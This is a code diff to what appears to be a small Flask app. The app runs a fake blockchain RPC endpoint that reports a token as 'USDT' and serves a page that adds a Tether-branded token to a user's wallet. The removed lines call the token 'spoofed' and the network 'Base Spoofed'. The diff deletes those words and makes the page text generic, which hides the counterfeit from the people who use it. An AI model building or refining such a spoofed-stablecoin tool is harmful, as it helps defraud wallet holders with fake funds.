@@ -64,7 +64,7 @@ def handle_rpc():
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x95d89b41":
-                symbol = "USDT"  # Simplified for price feed
+                symbol = "USDT"
                 length = len(symbol)
                 length_hex = hex(32)[2:].zfill(64)
                 str_length_hex = hex(length)[2:].zfill(64)
@@ -96,7 +96,7 @@ def add_token():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Add USDT to MetaMask</title>
+        <title>Add Token</title>
         <style>
             body {
                 font-family: 'Roboto', sans-serif;
@@ -167,8 +167,8 @@ def add_token():
     </head>
     <body>
         <div class="container">
-            <h1>Add USDT to MetaMask</h1>
-            <p>Click below to add the spoofed USDT token to your wallet on Base Spoofed.</p>
+            <h1>Add Token</h1>
+            <p>Click below to add the token to your wallet.</p>
             <div class="token-info">
                 <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT Logo">
                 <span>Tether USD (Base) - 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2</span>
@@ -180,7 +180,7 @@ def add_token():
             async function addToken() {
                 const status = document.getElementById('status');
                 if (!window.ethereum) {
-                    status.textContent = 'Please install MetaMask!';
+                    status.textContent = 'Please install a compatible wallet!';
                     return;
                 }
                 try {
